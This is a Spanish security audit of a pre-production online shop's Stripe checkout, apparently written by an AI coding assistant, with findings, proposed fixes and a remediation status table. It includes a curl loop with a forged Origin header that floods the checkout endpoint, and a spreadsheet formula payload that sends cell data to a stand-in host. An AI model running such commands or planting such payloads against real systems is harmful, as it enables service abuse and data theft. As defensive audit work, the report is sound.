# Auditoría de seguridad · ECLIPSSEINORBIT

**Fecha:** 2026-09-21
**Revisión complementaria:** 2026-09-21
**Rama auditada:** `auditoria-preproduccion` (commit `bb3f74c`)
**Alcance:** abuso y rotura del flujo de compra, no el flujo feliz. Revisión de código en
solo lectura. **No se ha modificado código ni configuración; solo se ha ampliado este informe.**
**Estado del proyecto:** no está en producción todavía.

---

## Resumen

**No hay hallazgos críticos.** Las tres cosas que suelen tumbar una tienda —que el importe
dependa de lo que manda el navegador, que el webhook acepte firmas falsas, que un secreto
acabe en el bundle del navegador— **están bien resueltas y comprobadas leyendo el código**.

Lo que hay es un hallazgo alto, diez medios y cinco bajos. Dos de los bajos son realmente
observaciones de endurecimiento o estabilidad, no vulnerabilidades explotables. La mayoría
son problemas de configuración, robustez y operación; cuatro afectan directamente a la
integridad del flujo de compra y de los pedidos.

| Severidad | Nº | Resumen |
|---|---|---|
| 🔴 Crítico | 0 | — |
| 🟠 Alto | 1 | Sin rate limiting en la creación de sesiones de pago |
| 🟡 Medio | 10 | Cabeceras, tope de `items`, origen por Host, desajuste de CP, dependencias, idempotencia, deduplicación, validación del pedido, confirmación de pago y minimización de notas |
| 🔵 Bajo | 5 | CSV en Airtable, `typecast`, código muerto, carrito, Nitro beta; los dos últimos son informativos |

---

## 🔧 Estado de corrección — 2026-09-22

Sesión de corrección por orden de severidad, un commit por arreglo, con
`npx tsc --noEmit` tras cada cambio y `npm run build` al final (✅ pasa).

| # | Estado | Nota |
|---|---|---|
| **A1** rate limiting | ⛔ **Pendiente — bloqueado** | El arreglo bueno es Vercel WAF o un contador compartido: cuenta, plan o configuración nueva. `CLAUDE.md` §11 obliga a preguntar a Ana. **Sigue siendo el bloqueante nº 1.** |
| **M1** cabeceras | ⛔ **Pendiente — bloqueado** | `vercel.json` es configuración de despliegue (§11). La propuesta de este informe sigue vigente, con la CSP en `Report-Only` primero. |
| **M2** tope de `items` | ✅ **Resuelto** | `.max(20)` en el esquema y agrupación por producto+talla antes de construir la sesión. Commit `61aa680`. |
| **M3** origen por Host | ⛔ **Pendiente — bloqueado** | Exigir `SITE_URL` sin confirmar antes que está en Vercel dejaría la tienda sin vender. Va junto con el dato del dominio. |
| **M4** desajuste de CP | 🟡 **Sin cambios, riesgo asumido** | Decisión previa de Ana. Sigue pendiente lo que añadía este informe: que la columna «Aviso envío» se vea sin buscarla. |
| **M5** `overrides` | ⛔ **Pendiente — bloqueado** | Tocar dependencias (§11). Es lo que tiene roto `npm run lint`. |
| **M6** idempotencia | ⛔ **Pendiente** | Necesita un identificador estable del intento de compra, o sea persistencia o un id del navegador. Es una decisión de diseño, no un arreglo mecánico. |
| **M7** validar el pedido | ✅ **Resuelto** | Marca `source` en la metadata al crear la sesión; el webhook la exige y valida `mode`, moneda, formato de `orderRef` y que el pago conste cobrado. Commit `a29f487`. |
| **M8** deduplicación | 🟡 **Parcial — documentado, no cerrado** | El arreglo real (clave de negocio persistente y atómica, más prueba con dos Event distintos) sigue pendiente y toca Airtable. Lo que sí se hizo: el código ya no describe como «cerrojo» algo que en concurrencia no lo es, y enumera los dos casos que no cubre. Commit `2bc21f0`. |
| **M9** confirmación de pago | 🟡 **Mínimo aplicado** | La página ya no afirma un pago que no comprueba, y se quitó la promesa del email que hoy nadie manda. **Falta la solución completa:** verificar la sesión en servidor y mostrar confirmado / pendiente / no confirmado. Commit `2ba23d1`. |
| **M10** notas libres | 🟡 **Mínimo aplicado** | Aviso junto al campo de no escribir datos sensibles. **Falta decidir** si las notas deben existir también en Stripe y comprobar la retención de payloads en n8n. Commit `6b42e27`. |
| **B1** CSV en Airtable | ✅ **Resuelto** | Notas, nombre y dirección pasan por un prefijo de apóstrofo si empiezan por `=`, `+`, `-`, `@`, tabulador o retorno. Commit `dcaa297`. |
| **B2** `typecast` | 🟡 **Sin cambios, a propósito** | Riesgo aceptado y documentado. Revisar si algún día se mapea texto del comprador a un campo de selección. |
| **B3** `chart.tsx` muerto | ⛔ **Pendiente** | Borrar el fichero es trivial, pero quitar `recharts` toca dependencias (§11). Se deja entero para no dejar una dependencia huérfana a medias. |
| **B4** carrito manipulable | ✅ **Sin acción — estaba bien** | Verificado de nuevo. |
| **B5** Nitro beta | ⛔ **Pendiente** | Actualizar dependencias (§11). |

⚠️ **Nada de lo corregido toca la configuración de producción, las dependencias
ni las reglas de negocio.** Los bloqueantes 1, 2, 5 y 6 de la lista del final
siguen abiertos; el 3 está cerrado, el 4 solo documentado, y el 7 resuelto.

🔹 **Hallazgo nuevo de esta sesión, que no estaba en ningún informe:** `npx tsc
--noEmit` devuelve **6 errores de tipos preexistentes** — 5 en
`src/components/ContactCTA.tsx` (arrays de `ease` que `framer-motion` no acepta
como tipo) y 1 en `src/routes/prendas.$slug.tsx:56` (`Property 'product' does
not exist on type 'undefined'`). No rompen el build ni se ha observado que
rompan en ejecución, pero significan que **el proyecto no compila limpio**.
Ninguno lo introdujo esta sesión: estaban antes de tocar nada.

### ⚠️ Límites de esta auditoría — léelos antes de fiarte del informe

- **No se ha leído `.env`.** El `CLAUDE.md` §1 lo prohíbe expresamente. Sí se ha revisado
  `.env.example`, porque es una plantilla pública sin valores secretos: contiene las cinco
  variables esperadas (`STRIPE_SECRET_KEY`, `STRIPE_WEBHOOK_SECRET`,
  `N8N_ORDER_WEBHOOK_URL`, `N8N_ORDER_WEBHOOK_SECRET` y `SITE_URL`). Todo lo que se dice
  sobre valores reales se apoya en el historial de git, el `.gitignore` y el código, **no**
  en el contenido real de `.env`. Que esas variables estén bien puestas en Vercel no se ha
  podido verificar.
- **No se ha inspeccionado la configuración real de Vercel.** El conector no está
  autorizado en esta sesión. Lo que se dice de cabeceras se basa en que **no existe
  `vercel.json`** ni configuración de headers en el repositorio; si hubiera algo puesto a
  mano en el panel de Vercel, este informe no lo ve.
- **No se ha ejecutado ningún ataque.** Todo es análisis estático y lectura. Los vectores
  descritos son razonados a partir del código, no ejecutados contra el sitio.
- **No se han comprobado los accesos y controles operativos de las cuentas reales** de
  Stripe, Vercel, Airtable, n8n, correo o dominio: MFA, roles, recuperación, alertas,
  rotación de secretos, copias y restauración quedan como controles pendientes de evidencia.
- **Esto es criterio técnico, no dictamen jurídico ni certificación.** Que no aparezca aquí
  no significa que no exista.

---

## 🟠 Alto

### A1 · No hay rate limiting en la creación de Checkout Sessions

**Archivo:** [src/lib/checkout.server.ts:22](src/lib/checkout.server.ts#L22)
**Severidad:** alta

La server function `createCheckoutSession` es un endpoint POST público y no tiene ningún
límite de peticiones. **El propio `CLAUDE.md` del proyecto lo exige** (§7: «Rate limiting
sí aplica a endpoints iniciados por usuarios (ej. el que crea la Checkout Session), no al
webhook»), y no está implementado en ningún sitio del repositorio.

**Cómo se explota**

El middleware CSRF de [src/start.ts:6](src/start.ts#L6) no lo impide. Leyendo su código en
`node_modules/@tanstack/start-client-core/dist/esm/createCsrfMiddleware.js`, valida contra
`Sec-Fetch-Site`, `Origin` o `Referer` — las tres son cabeceras que el atacante escribe a
mano. Basta con ponerlas bien:

```bash
# En bucle, sin navegador
while true; do
  curl -s -X POST "https://www.eclipssebrand.es/_serverFn/createCheckoutSession" \
    -H "Origin: https://www.eclipssebrand.es" \
    -H "Content-Type: application/json" \
    -d '{"data":{"shippingPostalCode":"41001","acceptTerms":true,
         "items":[{"id":"camiseta-azul","size":"M","qty":1}]}}'
done
```

Cada petición **crea una Checkout Session real en Stripe**. Consecuencias, por orden de
molestia: el panel de Stripe se llena de sesiones abandonadas hasta hacer inservible la
conciliación; se agota el límite de escritura de la cuenta de Stripe y **los clientes
legítimos dejan de poder pagar**; y se dispara la factura de funciones de Vercel.

Es un ataque de abuso y disponibilidad, no de robo: el importe se recalcula siempre en
servidor y no se puede cobrar de menos por esta vía. Por eso es alto y no crítico.

**Cómo se arregla**

Un límite por IP antes de llamar a Stripe. En Vercel, la dirección debe obtenerse de una
cabecera que la plataforma controle (`x-vercel-forwarded-for` o, sin proxy intermedio,
`x-forwarded-for`), no de una cabecera arbitraria elegida por el cliente.

Un `Map` en memoria por instancia puede servir **solo como defensa provisional adicional**:
Vercel crea y escala instancias, y cada una tendría su propio contador. No debe presentarse
como el control suficiente para producción. Las opciones preferentes son una regla de rate
limiting en Vercel WAF o un contador compartido como Upstash/Vercel KV. Ambas pueden depender
del plan, de una cuenta o de una configuración nueva, por lo que `CLAUDE.md` §11 obliga a
preguntarlo antes.

Fuentes: [cabeceras de petición de Vercel](https://vercel.com/docs/headers/request-headers) ·
[rate limiting con Vercel WAF](https://vercel.com/kb/guide/add-rate-limiting-vercel).

⛔ **El webhook (`/api/stripe-webhook`) se deja fuera del límite.** `CLAUDE.md` §4 lo
prohíbe expresamente: Stripe reintenta de forma legítima y un límite mal puesto bloquea
entregas reales.

---

## 🟡 Medio

### M1 · Ninguna cabecera de seguridad

**Archivos:** no existe `vercel.json`; tampoco hay configuración de headers en
[vite.config.ts](vite.config.ts)
**Severidad:** media

Buscando `content-security-policy|strict-transport|x-frame-options|x-content-type|referrer-policy`
en todo el repositorio solo aparecen los `content-type` de las páginas de error. Faltan
**todas**: CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy y
Permissions-Policy.

**Qué se puede hacer con eso**

- **Clickjacking sobre `/checkout`.** Sin `X-Frame-Options` ni `frame-ancestors`, la página
  de pago se puede embeber en un iframe invisible dentro de otra web y superponerle
  botones. En esta tienda el daño es limitado porque el formulario obliga a escribir un
  CP y marcar dos casillas, pero el bloqueo cuesta una línea.
- **Sin CSP, cualquier XSS futuro se ejecuta sin freno.** Hoy no hay XSS (ver B3), pero
  la web carga una hoja de estilos **de un tercero**, Google Fonts, en
  [src/routes/\_\_root.tsx:99-102](src/routes/__root.tsx#L99-L102). Si ese recurso se
  compromete o se añade mañana cualquier script de analítica, no hay nada que lo contenga.
- **Conviene fijar `Referrer-Policy` expresamente**, pero no es correcto afirmar que los
  navegadores modernos enviarán por defecto la URL completa a Google Fonts. La política
  predeterminada actual es normalmente `strict-origin-when-cross-origin`, que en una
  petición a otro origen envía solo el origen. Definirla sigue evitando depender del
  navegador y de configuraciones antiguas. Fuente:
  [W3C Referrer Policy](https://www.w3.org/TR/referrer-policy/).
- **Sin `X-Content-Type-Options: nosniff`**, el navegador puede adivinar el tipo de un
  recurso servido desde `/public` y ejecutarlo como script.

**Cómo se arregla**

Un `vercel.json` en la raíz con un bloque `headers` que aplique a `/(.*)`:

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "Strict-Transport-Security", "value": "max-age=31536000" },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
        { "key": "Permissions-Policy", "value": "camera=(), microphone=(), geolocation=(), interest-cohort=()" },
        { "key": "Content-Security-Policy", "value": "default-src 'self'; img-src 'self' data: https://*.stripe.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://api.stripe.com; frame-ancestors 'none'; form-action 'self' https://checkout.stripe.com; base-uri 'self'; object-src 'none'" }
      ]
    }
  ]
}
```

⚠️ **Tres avisos sobre esta configuración.** Primero: `CLAUDE.md` §11 obliga a **preguntar a Ana antes
de tocar configuración de despliegue**, así que esto se propone, no se aplica. Segundo: el
`script-src` no está incluido a propósito. TanStack Start inyecta scripts en el HTML y hace
falta probar en un despliegue de preview si necesita `'unsafe-inline'` o nonces; **poner un
`script-src` mal calculado deja la tienda en blanco**. Se despliega primero con
`Content-Security-Policy-Report-Only`, se mira la consola y luego se activa.
Tercero: no debe activarse `preload` en HSTS por inercia. Antes hay que confirmar que el
dominio y todos los subdominios que cubra `includeSubDomains` funcionan permanentemente por
HTTPS y aceptar que la reversión no es inmediata. Para el primer despliegue es más prudente
empezar sin `preload` y aumentarlo después de verificar el dominio real.

---

### M2 · `items` sin tope de longitud ni deduplicación

**Archivo:** [src/lib/checkout-schema.ts:27](src/lib/checkout-schema.ts#L27)
**Severidad:** media

```ts
items: z.array(cartItemSchema).min(1, "El carrito está vacío"),
```

Hay `.min(1)` pero no `.max()`. Cada línea sí está bien acotada (`qty` es entero entre 1 y
99, `size` máximo 40 caracteres), pero **el número de líneas es libre**, y el esquema
tampoco impide repetir cien veces el mismo `id` y la misma talla.

**Cómo se explota**

Un array de miles de entradas se recorre entero dos veces
([checkout.server.ts:28](src/lib/checkout.server.ts#L28) y
[:52](src/lib/checkout.server.ts#L52), cada una con una búsqueda lineal en el catálogo)
**antes** de que el control de peso rechace nada. Y en el borde exacto: 125 gorras de 120 g
suman justo los 15 000 g del límite, así que pasan la validación y se le mandan a Stripe
**125 line items**, por encima de su máximo de 100 → error de la API → 500 sin mensaje
útil, cuando lo correcto sería decirle al cliente que su pedido es demasiado grande.

No se roba dinero: el importe y el peso se recalculan siempre en servidor desde
`src/data/products.ts`. Es consumo de CPU y un error feo en la cara del comprador.

**Cómo se arregla**

Dos líneas:

```ts
items: z.array(cartItemSchema).min(1, "El carrito está vacío").max(20, "Demasiadas líneas"),
```

y agrupar las líneas duplicadas por `id`+`size` antes de construir `lineItems`, sumando las
cantidades. Con eso el pedido nunca puede tener más de 20 líneas ni pasarse del límite de
Stripe.

---

### M3 · El origen de las URLs sale del Host de la petición

**Archivo:** [src/lib/checkout.server.ts:10-14](src/lib/checkout.server.ts#L10-L14)
**Severidad:** media

```ts
function resolveOrigin(): string {
  const fromEnv = process.env.SITE_URL?.replace(/\/$/, "");
  if (fromEnv) return fromEnv;
  return new URL(getRequest().url).origin;   // ← sale del Host de la petición
}
```

Si `SITE_URL` no está definida, el origen se deduce de la cabecera `Host`. Con ese origen
se construyen `success_url`, `cancel_url`
([:108-109](src/lib/checkout.server.ts#L108-L109)) y las URLs de imagen que se le mandan a
Stripe ([:44](src/lib/checkout.server.ts#L44)).

**Honestidad sobre la explotabilidad:** en Vercel es limitada. Vercel enruta por Host y solo
acepta los dominios configurados del proyecto, así que **no se puede apuntar el
`success_url` a un dominio del atacante**; como mucho, a un dominio de preview del propio
proyecto. El `success_url` lleva `session_id={CHECKOUT_SESSION_ID}` en la URL, y esa sesión
es del propio atacante, así que no se filtran datos ajenos.

Se incluye porque **depender de una cabecera que manda el cliente para construir una URL de
pago es frágil por construcción**, y porque el arreglo cuesta un minuto.

**Cómo se arregla**

Exigir la variable en vez de adivinar:

```ts
function resolveOrigin(): string {
  const fromEnv = process.env.SITE_URL?.replace(/\/$/, "");
  if (!fromEnv) throw new Error("SITE_URL no está configurada");
  return fromEnv;
}
```

⚠️ **Antes de hacer ese cambio hay que confirmar que `SITE_URL` está definida en Vercel**,
o la tienda deja de vender. No se ha podido comprobar desde aquí (ni acceso a Vercel ni
lectura del `.env`).

---

### M4 · El CP con el que se cobra y la dirección de entrega pueden no coincidir

**Archivos:** [src/lib/checkout.server.ts:59-78](src/lib/checkout.server.ts#L59-L78) ·
[src/routes/api.stripe-webhook.ts:116-139](src/routes/api.stripe-webhook.ts#L116-L139)
**Severidad:** media · **ya conocido y asumido**

El envío se cobra con el código postal que el cliente escribe en nuestro formulario. Stripe
recoge la dirección real **después**, cuando el importe ya está cerrado. Nada obliga a que
coincidan.

**Cómo se explota**

Escribir `41001` (Sevilla, 4,50 €) en el checkout y luego, en la pantalla de Stripe, poner
una dirección de Barcelona (4,99 €) o de Palma (6,50 €). Diferencia máxima real: **4,49 €**
por pedido, en el tramo de 15 kg entre Sevilla y Baleares.

Más relevante que el dinero: **se puede saltar el bloqueo de Canarias, Ceuta y Melilla**.
Un CP peninsular pasa la validación de cobertura y luego se entrega una dirección de Las
Palmas, con la que la tienda no puede cumplir ni fiscalmente (fuera del IVA peninsular).

**Qué defensa hay hoy**

El webhook detecta el desajuste y escribe un texto ya redactado en la columna «Aviso envío»
de Airtable:

```
NO ENVIAR — la dirección de entrega (CP 35007) está en Canarias, Ceuta o Melilla,
donde no enviamos. Se cobró como peninsula (CP 28001). Contactar con el cliente…
```

Está implementado y probado de punta a punta el 2026-09-21 (commit `00aec8e`), y ya consta
en `00_ESTADO_PROYECTO.md` como agujero conocido y asumido, con la decisión de Ana de no
cerrarlo ahora.

⚠️ **Lo que este informe añade: es un control detectivo, no preventivo.** Solo funciona si
una persona mira esa columna **antes** de preparar el paquete. Si nadie la mira, es como si
no existiera. Merece la pena convertirlo en algo que se vea sin buscarlo: una vista filtrada
en Airtable con «Aviso envío» no vacío, o un aviso en el canal que se use a diario.

La salida técnica definitiva ya está evaluada y documentada en el estado del proyecto (pedir
la dirección completa en nuestro checkout y pasarla a Stripe con
`payment_intent_data.shipping`). No se reabre aquí: es una decisión ya tomada.

---

### M5 · Los `overrides` de dependencias no arreglan nada y rompen el linter

**Archivo:** [package.json](package.json), bloque `overrides`
**Severidad:** media

`npm audit` devuelve **10 vulnerabilidades (6 altas, 4 moderadas)**. Todas vienen de dos
paquetes que el propio bloque `overrides` intenta fijar, y lo hace mal. Verificado con
`npm ls`:

**`js-yaml` → forzado a `5.2.0`**
```
+-- @tanstack/react-start → @tanstack/start-plugin-core → xmlbuilder2@4.0.3 → js-yaml@5.2.0
`-- eslint → @eslint/eslintrc → js-yaml@5.2.0 overridden
```
GHSA-pm4m-ph32-ghv5 (alta, DoS por parseo exponencial) afecta al rango **≤ 5.2.1**.
**La versión fijada sigue siendo vulnerable: el override no arregla nada.** Y se está
metiendo una versión mayor dentro de `xmlbuilder2@4.0.3`, que no está escrito para ella.

**`brace-expansion` → forzado a `5.0.7`**
```
+-- eslint@9.39.5 → minimatch@3.1.5 → brace-expansion@5.0.7 overridden
`-- typescript-eslint → @typescript-eslint/typescript-estree → minimatch@10.2.6 → deduped
```
GHSA-rgw5-rvv9-x895 (alta) afecta a **< 5.0.9**: también sigue vulnerable. Y hay un efecto
secundario concreto: `minimatch@3.1.5` espera la API de `brace-expansion` 1.x. **Esta es la
causa exacta del `TypeError: expand is not a function` que tiene `npm run lint` roto**, un
problema que el estado del proyecto arrastra como «preexistente, sin arreglar» desde hace
semanas. Hoy el proyecto **no tiene análisis estático** por culpa de este override.

**`undici` → forzado a `7.28.0`**
`npm ls undici` devuelve vacío. **Nada lo usa.** Override muerto.

**Por qué es medio y no alto:** las cuatro vulnerabilidades son DoS por consumo de recursos
y **toda la cadena es de build y desarrollo** (ESLint, el plugin de TanStack). No hay
superficie de ataque en el runtime de la tienda: ningún usuario le puede mandar YAML a la
web. El riesgo real es de mantenimiento y suministro, no de explotación remota.

**Cómo se arregla**

Quitar los tres overrides, `npm install`, `npm audit fix`, y comprobar que **`npm run lint`
vuelve a funcionar** y que `npm run build` sigue pasando. Si `npm audit` deja algo abierto
después, se fija esa dependencia concreta a una versión **parcheada de verdad**
(`js-yaml ≥ 5.2.2`, `brace-expansion ≥ 5.0.9`), no a una que ya está en el rango afectado.

---

### M6 · La clave de idempotencia cambia en cada reintento

**Archivo:** [src/lib/checkout.server.ts:80-82](src/lib/checkout.server.ts#L80-L82) ·
[src/lib/checkout.server.ts:121](src/lib/checkout.server.ts#L121)
**Severidad:** media

El código crea `orderRef` con `randomUUID()` dentro de cada ejecución del handler y usa
`checkout:${orderRef}` como clave de idempotencia. La clave es única, pero no es estable:
si el navegador repite la misma operación, el servidor genera otro UUID y Stripe recibe una
clave distinta. Por tanto, puede crear una segunda Checkout Session.

Esto contradice `CLAUDE.md` §2, que exige que la clave represente una operación lógica y no
una petición HTTP aleatoria. Stripe también exige reutilizar la misma clave para reconocer un
reintento: [peticiones idempotentes de Stripe](https://docs.stripe.com/api/idempotent_requests).

**Consecuencia:** dobles clics, reintentos del navegador o errores de red pueden llenar
Stripe de sesiones distintas para el mismo intento de compra. Normalmente solo una acabará
pagada, pero la protección documentada no existe realmente y agrava A1.

**Cómo se arregla:** crear y conservar un identificador estable del intento de compra antes
de llamar a Stripe, reutilizarlo al reintentar exactamente la misma operación y evitar que un
identificador aportado por el navegador permita acceder a datos de otros pedidos. Si no se
quiere añadir persistencia, hay que reconocer expresamente que la clave actual solo identifica
una llamada y no protege reintentos entre llamadas.

---

### M7 · El webhook no comprueba que la sesión sea un pedido propio de esta tienda

**Archivo:** [src/routes/api.stripe-webhook.ts:87-105](src/routes/api.stripe-webhook.ts#L87-L105)
**Severidad:** media

La firma demuestra que el evento lo envió Stripe para el endpoint configurado, pero después
de releer la sesión el código no exige una marca inequívoca de ECLIPSSEINORBIT ni valida de
forma explícita `mode`, moneda, `orderRef` y estado final de pago. Cualquier Checkout Session
relevante de la misma cuenta podría llegar al Airtable de pedidos si la cuenta se reutiliza
para otro flujo.

**Cómo se arregla:** al crear la sesión, añadir una metadata fija y no controlable por el
cliente, por ejemplo `source: "eclipsseinorbit-web-v1"`. En el webhook, antes de enviar nada
a n8n, exigir esa marca, un `orderRef` con el formato esperado, `mode === "payment"`, moneda
`eur` y un `payment_status` compatible con el tipo de evento. Documentar también si la cuenta
Stripe es exclusiva de esta tienda; si lo es, reduce el riesgo, pero no sustituye la defensa.

---

### M8 · La deduplicación no cubre eventos distintos sobre la misma sesión

**Archivos:** [src/lib/webhook-dedup.server.ts](src/lib/webhook-dedup.server.ts) ·
[src/routes/api.stripe-webhook.ts:65-105](src/routes/api.stripe-webhook.ts#L65-L105)
**Severidad:** media

Las tres barreras actuales usan `event.id`: memoria, metadata del PaymentIntent y `upsert` de
Airtable. Funcionan cuando Stripe reenvía **el mismo Event**, que es lo que se probó. No
cubren el caso en el que Stripe genere dos objetos Event distintos para el mismo objeto y
tipo; tendrán IDs diferentes y ambos pasarán.

Stripe recomienda usar también el ID de `data.object` junto con `event.type` para detectar
ese caso: [duplicados en webhooks de Stripe](https://docs.stripe.com/webhooks#handle-duplicate-events).

**Cómo se arregla:** conservar `event.id` para reenvíos y añadir una clave de negocio
persistente, como `checkoutSessionId + event.type`, o actualizar el pedido por `orderRef` /
`checkoutSessionId` en vez de crear registros por cada `eventId`. La operación en Airtable
debe ser atómica y se debe probar con dos IDs de evento distintos que representen la misma
sesión y el mismo tipo.

---

### M9 · La página de confirmación afirma que el pago se recibió sin comprobarlo

**Archivo:** [src/routes/pedido.confirmado.tsx:21-38](src/routes/pedido.confirmado.tsx#L21-L38)
**Severidad:** media

La ruta no consulta `session_id` ni el estado del pedido, pero muestra siempre «Hemos recibido
tu pago». Cualquiera puede abrir la URL directamente, y un comprador también puede llegar
antes de que el webhook haya terminado. Esto no marca el pedido como pagado en Airtable,
pero comunica al usuario un hecho que el sistema todavía no ha confirmado y contradice el
principio de `CLAUDE.md` §3.

**Cómo se arregla:** como mínimo, cambiar el texto por «Stripe ha finalizado el proceso y
estamos confirmando tu pedido». La solución completa es consultar en servidor una referencia
opaca, verificar que corresponde a una sesión propia y mostrar `confirmado`, `pendiente` o
`no confirmado` sin exponer datos personales.

---

### M10 · Las notas libres se copian a metadata de Stripe sin advertencia de minimización

**Archivos:** [src/routes/checkout.tsx:169-172](src/routes/checkout.tsx#L169-L172) ·
[src/lib/checkout.server.ts:110-118](src/lib/checkout.server.ts#L110-L118)
**Severidad:** media

El campo «Notas del pedido» admite 500 caracteres libres y su contenido completo se guarda
en la metadata de la Checkout Session; después también viaja por Vercel y n8n hasta Airtable.
Aunque la aplicación no pida datos sensibles, el comprador puede escribir teléfonos,
direcciones alternativas, información de salud u otros datos innecesarios. El informe anterior
afirmaba que en metadata no había «ningún dato identificativo de más», algo que no puede
garantizarse con texto libre.

Stripe indica que no debe almacenarse información sensible en metadata:
[metadata de Stripe](https://docs.stripe.com/api/metadata).

**Cómo se arregla:** indicar junto al campo «No incluyas datos bancarios, de salud ni otra
información sensible»; valorar una lista cerrada de instrucciones habituales; y decidir si
las notas necesitan existir también en Stripe o basta con el sistema de pedidos. Además, hay
que comprobar si n8n conserva el cuerpo de las ejecuciones y aplicar una retención coherente
con la política publicada.

---

## 🔵 Bajo

### B1 · Inyección de fórmulas al exportar Airtable a CSV

**Archivos:** [src/lib/checkout-schema.ts:22](src/lib/checkout-schema.ts#L22) →
[src/routes/api.stripe-webhook.ts:171](src/routes/api.stripe-webhook.ts#L171) → nodo
«Crear pedido» del workflow de n8n

`orderNotes` son 500 caracteres libres que el comprador escribe y que llegan sin escapar a
la columna «Notas» de Airtable. Lo mismo con el nombre y la dirección que devuelve Stripe.

Airtable **no** evalúa el contenido de una celda de texto como fórmula, así que ahí no pasa
nada. El problema aparece al **exportar a CSV y abrirlo en Excel o LibreOffice**: un valor
que empiece por `=`, `+`, `-` o `@` se ejecuta como fórmula en el equipo de quien lo abra.

```
=HYPERLINK("https://malo.example/?d="&A1&A2,"Haz clic para ver el pedido")
```

**Arreglo:** antes de mandar el payload a n8n, prefijar con un apóstrofo los valores de
texto libre que empiecen por esos cuatro caracteres.

### B2 · `typecast: true` en el nodo de Airtable

**Dónde:** workflow `qmS3k2Pp3wxyKUqZ` («Pedidos Stripe — ECLIPSSEINORBIT»), nodo «Crear
pedido», `options.typecast`

Con `typecast` activo, Airtable **crea valores nuevos** en los campos de selección en vez de
rechazar lo que no encaja. Ya hay rastro de que ha pasado: el campo «Estado» tiene una
opción basura `"\tPagado"` (con una tabulación delante) junto a la buena.

Hoy no lo puede provocar un cliente —«Estado» sale de un ternario fijo en
[api.stripe-webhook.ts:144-145](src/routes/api.stripe-webhook.ts#L144-L145)— pero es una
puerta abierta el día que se mapee a un campo de selección algo que escriba el comprador.
El estado oficial del proyecto recoge una decisión posterior: **mantener `typecast`** para
que un valor inesperado no haga fallar n8n y se pierda el pedido. Por tanto, no se propone
quitarlo ahora. El control compensatorio es mantener los campos de selección alimentados
solo desde valores cerrados del servidor, alertar si aparece una opción nueva y limpiar las
opciones basura durante el mantenimiento. Si en el futuro se mapea texto del comprador a un
campo de selección, esta decisión debe revisarse antes de desplegar.

### B3 · `dangerouslySetInnerHTML` en código muerto

**Archivo:** [src/components/ui/chart.tsx:73](src/components/ui/chart.tsx#L73)

Es el único `dangerouslySetInnerHTML` de todo el proyecto. Viene de la plantilla de shadcn
y **no lo importa nadie**: `grep -rn "ui/chart" src/` no devuelve ni una línea. No es
explotable. Se anota porque borrarlo (junto con `recharts`, que solo existe para él) deja el
proyecto **sin ningún sink de XSS**, y eso simplifica cualquier revisión futura.

### B4 · El carrito en localStorage se puede manipular — sin impacto

**Archivos:** [src/lib/cart.tsx:45-65](src/lib/cart.tsx#L45-L65) ·
[src/lib/checkout.server.ts:28-50](src/lib/checkout.server.ts#L28-L50)

Se incluye porque estaba en el encargo, y la respuesta es que **está bien resuelto**.
Cualquiera puede editar `eclipsse_cart_v1` en el navegador y poner precios, productos o
tallas inventadas. No sirve de nada:

- El precio del carrito **nunca viaja al servidor**: el payload solo lleva `id`, `size` y
  `qty`, y `checkout.server.ts:41` coge el `priceCents` del catálogo.
- Un `id` inexistente se rechaza en [:30-33](src/lib/checkout.server.ts#L30-L33).
- Una talla que ese producto no tiene se rechaza en
  [:34-36](src/lib/checkout.server.ts#L34-L36).
- Cantidades negativas, decimales o enormes las corta `cartItemSchema`
  (`z.number().int().min(1).max(99)`).
- El peso y la zona de envío se recalculan en servidor
  ([:59-78](src/lib/checkout.server.ts#L59-L78)).

✅ **Verificado leyendo el código: no hay forma de manipular el importe desde el cliente.**

### B5 · Nitro en versión beta en el runtime de producción

**Archivo:** [package.json](package.json) — `"nitro": "3.0.260603-beta"`

Es el servidor que sirve la tienda. No tiene ningún CVE conocido; se anota como riesgo de
estabilidad, no de seguridad. Hay una beta más reciente (`3.0.260903-beta`).
`CLAUDE.md` §11 obliga a preguntar antes de actualizar dependencias.

---

## Observaciones que no son vulnerabilidades pero afectan a producción

🔹 **No existe ningún nodo de Gmail.** El encargo hablaba de «n8n → Airtable → Gmail». El
workflow activo (`qmS3k2Pp3wxyKUqZ`) tiene **cuatro nodos**: Webhook → Airtable (upsert) →
Responder 200 → nota. El de respaldo (`17y7m9VMFcYZDNff`, desactivado) tampoco tiene Gmail.
Pero [src/routes/pedido.confirmado.tsx:36](src/routes/pedido.confirmado.tsx#L36) le promete
al comprador: *«Te enviaremos un email con los detalles y el seguimiento del envío»*. **Hoy
nadie envía ese email**, salvo que Stripe tenga activados sus recibos automáticos —cosa que
no se ha podido comprobar desde aquí—. Hay que decidirlo antes de vender.

🔹 **El banner de cookies no gobierna nada.** [src/components/CookieBanner.tsx](src/components/CookieBanner.tsx)
guarda «aceptado» o «rechazado» en `localStorage` y ya está: no se pone ninguna cookie en
toda la web, y la hoja de estilos de Google Fonts se carga siempre, antes de que el usuario
elija. Rechazar no cambia absolutamente nada. Es un problema de coherencia con lo que dice
la política de cookies, más que de seguridad.

🔹 **La retención prometida no la aplica nadie.** La política de privacidad promete borrar a
los 6 y 3 años. En Airtable no borra nada nadie. Ya está anotado en
`00_ESTADO_PROYECTO.md`; se repite porque estaba en el encargo.

🔹 **La autenticación del webhook de n8n está bien.** El nodo Webhook usa
`authentication: headerAuth` con la credencial «Pedidos Eclipssebrand Stripe», que se
corresponde con la cabecera `X-Webhook-Secret` que manda
[api.stripe-webhook.ts:203-211](src/routes/api.stripe-webhook.ts#L203-L211). La ruta
(`/webhook/stripe-eclipsse-order`) es pública, así que ese secreto compartido es la única
defensa: **no puede acabar nunca en un repositorio, un log ni una captura de pantalla.**

### Controles operativos de producción · pendientes de evidencia

Estos controles no pueden darse por aprobados leyendo el repositorio. Deben figurar en el
informe para que «no revisado» no se interprete como «correcto»:

- **Cuentas y accesos:** MFA en Stripe, Vercel, Airtable, n8n, correo y registrador del
  dominio; usuarios nominales, permisos mínimos, recuperación segura y retirada de accesos.
- **Secretos:** confirmar que cada entorno usa sus propios secretos, que las claves live no
  están en previews ni desarrollo, quién puede leerlas y cómo se rotan o revocan.
